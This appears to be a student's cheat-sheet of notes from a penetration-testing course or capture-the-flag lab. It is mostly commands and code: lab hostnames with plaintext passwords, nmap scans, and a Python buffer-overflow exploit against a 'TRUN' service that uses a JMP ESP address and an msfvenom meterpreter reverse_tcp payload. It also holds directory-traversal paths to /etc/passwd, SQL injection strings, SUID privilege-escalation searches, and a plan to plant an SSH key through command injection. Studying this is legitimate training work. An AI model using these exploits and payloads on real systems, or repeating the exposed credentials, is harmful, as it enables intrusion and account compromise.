# Useful Links

## GTFO BINS
https://gtfobins.github.io/

## Security CTFD Server
https://sec.cybbh.io/public/security/latest/index.html

	CTFD Server: http://10.50.20.250:8000	
	User: NIRI-505-M  
	Pass: gVN5chrkxW0bym1 	

## LinOps:
	ssh -X student@10.50.22.235
	password1

 ## Winops:

	xfreerdp /u:student /p:password /dynamic-resolution +clipboard /v:10.50.29.77

 # Host Discovery 

     nmap -v -sT -Pn -T4 -sV 192.168.28.111,120

## Places to check

	ip n
 	ip a / arp -a
  	cat /etc/hosts
   	ps -elf
    	ss -ntlp
     	cron
      /var/tmp
      /tmp
      	
     	
## HTTP Enumeration Script:

    nmap -v -sT -Pn -T4 --script=http-enum.nse 192.168.28.111 -p 80

## Ping Sweep: 

     for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" & ); done

     
### secureServerBuffo.py script
	#!/usr/bin/python2.7
	
	import socket
	
	'''
	625011AF
	625011BB
	msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.X.X lport=4444 -b "\x00" -f python
 	lhost = linux opstation, or whatever host is used to as the attack platform for operation. 
  
    Set multi/handler on msfconsole, & and use script with msfvenom payload 
	'''
	
	
	buf = "TRUN /.:/" #Exploit
	buf += "A" * 2003 #Buffer Offset
	buf += "\xa0\x12\x50\x62"  #JMP ESP
	buf += "\x90" * 15 #NOP SLED
	buf += #SHELLCODE HERE
	s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) # Creates IPv4 socket
	
	s.connect(("0.0.0.0",412XX))    #IP and port to connect to through tunnel
 	print s.recv(1024)   #print response
	s.send(buf)       #sends the variable buf
	print s.recv(1024)   #print response
	s.close()         #close the connection



# Review 

nmap scan:

	nmap -v -sT -Pn -T4 -sV <ip>

http-enum scan

     	nmap -v -sT -Pn -T4 --script=http-enum.nse <ip> -p 80

      Check /img/ for network map

directory traversal:

	Usually found in File to Read search bar. 

	../../../../../etc/passwd
 	../../../../../etc/hosts
  
Fuzzing the pages:

	pick.php?product=7 OR 1=1 ;
 	products7 UNION SELECT 1,2,3

   	<URL>/pick.php?product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns	# golden Statement


Escalating Privs on Linux:

	find binaries with guid bit set. 

 	find / -type f -perm /2 -o -type d -perm /2 2>/dev/null  # Search for any file or directory that is writable by the context "other"

	find / -type f -perm /4000 -ls 2>/dev/null 	# finds commands with the suid bit set. 
 
 	find / -type f -perm /2000 -ls 2>/dev/null 	# finds commands with the guid bit set. 

	find / -type f -writable -o -type d -writable 2>/dev/null # Search for any file or directory that is writable by the current user /tmp 


Finding running service ports if nc doesn't give adequate results (Windows):
	
 	Grab pid # from: 
  		tasklist /sv | findstr <service name>
	run netstat -ano | findstr "pid#"

## Cronttab 
	/var/spool/cron/crontabs
	/etc/crontab


## Reverse Engineering:

 	file on the file

   	run the file 
    	gdb ./file
     	info functions

      	
	./reverse_engineer_me $(echo "AAAAAAAAAAAAAAAAAAAAAAA")
 	gdb-peda$ run <<<$(echo "./mybuff.py")

 	pdisass main 
  	EIP register
## On the other box:

env - gdb ./function 
dissassemble main
dissassemble (other func)
show env 
unset env
run program and crash it
info proc map
find /b <after the heap>, <end of the stack> oxff, oxe4
   ^convert to little endian^

   	unset env COLUMNS
    	unset env LINES
     	show env
      	run

       crash it
       info proc map
       
    

## Command Injection:

If Command injection is possible, then try to drop our public key into the users .ssh directory.
Generate new keys:

  	ssh-keygen -t rsa -b 4096
